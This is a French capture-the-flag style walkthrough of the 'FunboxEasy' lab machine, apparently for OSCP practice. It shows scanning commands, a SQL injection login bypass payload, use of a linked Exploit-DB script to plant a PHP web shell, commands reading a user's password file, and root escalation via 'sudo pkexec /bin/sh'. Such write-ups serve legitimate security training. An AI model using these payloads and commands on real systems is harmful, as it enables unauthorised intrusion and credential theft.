# FunboxEasy

    sudo nmap -A -p1-10000 192.168.249.111
    sudo masscan -p1-65535,U:1-65535 --rate=1000 192.168.249.111 --tun0
    sudo /home/timothe/.local/bin/autorecon 192.168.249.111
    feroxbuster -u http://192.168.249.111

Scans classiques. 

J'ai repéré et inspecté quelques URL intéressantes : 

    http://192.168.249.111/admin
    http://192.168.249.111/gym/ 
    http://192.168.249.111/gym/ex/admin/
    http://192.168.249.111/gym/admin/
    http://192.168.249.111/secret
    http://192.168.249.111/store/database
    ...

On peut facilement contourner le formulaire de login qui se situe sur la page http://192.168.249.111/admin grâce à ce petit exploit : https://www.exploit-db.com/exploits/47874

On peut aussi, grâce au même payload ( '=''or' ), modifier le mot de passe de l'administrateur sur la page http://192.168.249.111/admin/change-password.php 

Sur la page http://192.168.249.111/store/admin_add.php on voit qu'une erreur SQL sort quand on tente d'ajouter un livre. Pour me rapprocher des conditions d'examen, j'ai choisi de creuser les exploits existants au lieu de bêtement passer par SQLMap, puisque ce dernier est interdit pour l'OSCP.

Et j'ai directement trouvé un exploit vérifié qui menait à une RCE : https://www.exploit-db.com/exploits/47887

    vim exploit_OnlineBookStore.py
    python2.7  exploit_OnlineBookStore.py http://192.168.249.111/store 

Bien entourer les commandes de guillemets sous peine d'avoir des exceptions et de faire crasher le shell.

Ou directement visiter les URL sur un navigateur une fois le web-shell injecté.
Exemple : http://192.168.249.111/store/bootstrap/img/nG2CKRPfqR.php?cmd=id

    RCE $ 'ls /home/tony '
    RCE $ 'cat /home/tony/password.txt'

On voit le mot de passe pour le SSH, le mot de passe pour http://192.168.249.111/gym/admin et le mot de passe pour http://192.168.249.111/store 

À noter que le mot de passe pour /store correspondait bien au mot de passe que j'avais trouvé dans le fichier http://192.168.249.111/store/database/www_project.sql en récupérant le hash puis en le crackant avec Hashcat. Il y avait sûrement énormément de manières différentes de terminer cette VM.

L'élévation de privilèges est triviale :

    ssh  -l tony 192.168.249.111
    sudo -l
    sudo pkexec /bin/sh
    find / -name "local.txt" 2>/dev/null
    cat /var/www/local.txt
    ls /root
    cat /root/proof.txt

    
